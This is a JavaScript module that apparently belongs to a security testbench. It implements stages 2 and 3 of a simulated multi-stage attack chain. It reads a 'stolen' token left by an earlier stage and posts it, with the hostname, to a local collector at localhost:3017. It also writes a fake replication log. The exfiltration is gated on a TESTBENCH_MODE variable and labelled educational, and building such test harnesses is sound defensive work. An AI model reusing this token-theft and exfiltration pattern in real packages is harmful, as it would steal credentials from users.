/**
 * Stage 2 + Stage 3:
 * - Reads stolen token written by stage 1
 * - Exfiltrates stage 2 evidence
 * - Performs “replication” and exfiltrates stage 3 evidence
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const http = require('http');

function readToken() {
  const tokenFile = path.join(process.cwd(), '.stolen', 'token.json');
  try {
    return JSON.parse(fs.readFileSync(tokenFile, 'utf8')).token;
  } catch {
    return null;
  }
}

function postJson({ hostname, port, path: targetPath }, payload) {
  return new Promise((resolve) => {
    try {
      const data = JSON.stringify(payload);
      const req = http.request(
        {
          hostname,
          port,
          path: targetPath,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
          }
        },
        (resp) => {
          resp.on('data', () => {});
          resp.on('end', () => resolve(true));
          resp.resume();
        }
      );
      req.on('error', () => resolve(false));
      req.write(data);
      req.end();
    } catch {
      resolve(false);
    }
  });
}

function appendEvidence(payload) {
  try {
    const scenarioRoot = path.join(process.cwd(), '..');
    const evidencePath = path.join(scenarioRoot, 'infrastructure', 'captured-data.json');
    const parsed = JSON.parse(fs.readFileSync(evidencePath, 'utf8'));
    if (parsed && Array.isArray(parsed.captures)) {
      parsed.captures.push({ timestamp: new Date().toISOString(), data: payload });
      fs.writeFileSync(evidencePath, JSON.stringify(parsed, null, 2));
    }
  } catch {
    // ignore
  }
}

async function stage2Chain() {
  const token = readToken();

  if (process.env.TESTBENCH_MODE === 'enabled') {
    appendEvidence({
      attack: 'multi-stage-attack-chain',
      stage: 'stage2',
      timestamp: new Date().toISOString(),
      hostname: os.hostname(),
      token,
      usedToken: !!token
    });

    await postJson(
      { hostname: 'localhost', port: 3017, path: '/collect' },
      {
        attack: 'multi-stage-attack-chain',
        stage: 'stage2',
        timestamp: new Date().toISOString(),
        hostname: os.hostname(),
        token,
        usedToken: !!token
      }
    );
  }

  // “Replication” simulation: write a log file that indicates spread.
  const replicationDir = path.join(process.cwd(), 'replication');
  fs.mkdirSync(replicationDir, { recursive: true });
  const spread = {
    timestamp: new Date().toISOString(),
    simulatedSpreads: 3,
    note: 'This is an educational replication simulation'
  };
  fs.writeFileSync(path.join(replicationDir, 'spread.json'), JSON.stringify(spread, null, 2));

  if (process.env.TESTBENCH_MODE === 'enabled') {
    appendEvidence({
      attack: 'multi-stage-attack-chain',
      stage: 'stage3',
      timestamp: new Date().toISOString(),
      hostname: os.hostname(),
      token,
      replicated: true
    });

    await postJson(
      { hostname: 'localhost', port: 3017, path: '/collect' },
      {
        attack: 'multi-stage-attack-chain',
        stage: 'stage3',
        timestamp: new Date().toISOString(),
        hostname: os.hostname(),
        token,
        replicated: true
      }
    );
  }

  return { ok: true };
}

module.exports = { stage2Chain };

